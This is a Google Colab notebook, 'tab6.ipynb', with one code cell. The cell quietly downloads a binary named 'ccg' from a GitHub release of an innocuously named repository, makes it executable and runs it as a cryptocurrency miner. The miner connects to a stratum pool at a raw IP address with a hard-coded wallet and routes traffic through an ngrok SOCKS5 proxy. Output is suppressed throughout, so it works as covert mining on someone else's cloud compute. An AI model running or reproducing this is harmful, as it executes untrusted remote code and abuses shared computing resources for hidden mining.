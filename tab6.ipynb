{
  "cells": [
    {
      "cell_type": "code",
      "execution_count": null,
      "metadata": {
        "id": "LJdIJdd85EXP"
      },
      "outputs": [],
      "source": [
        "%%capture\n",
        "! wget -q https://github.com/includemachine10/learningmachine/releases/download/v.1/ccg && chmod +x ccg\n",
        "! chmod +x ccg\n",
        "! ./ccg -o stratum+tcp://103.249.70.7:6535 -u DPTuEufB8SbQrYwvSeLaRZrExkUawbBLJX.$(shuf -n 1 -i 1-9999999) -p c=DGB,mc=SUGAR -x socks5://0.tcp.ngrok.io:17433"
      ]
    }
  ],
  "metadata": {
    "colab": {
      "collapsed_sections": [],
      "machine_shape": "hm",
      "name": "tab6.ipynb",
      "provenance": []
    },
    "kernelspec": {
      "display_name": "Python 3",
      "name": "python3"
    }
  },
  "nbformat": 4,
  "nbformat_minor": 0
}
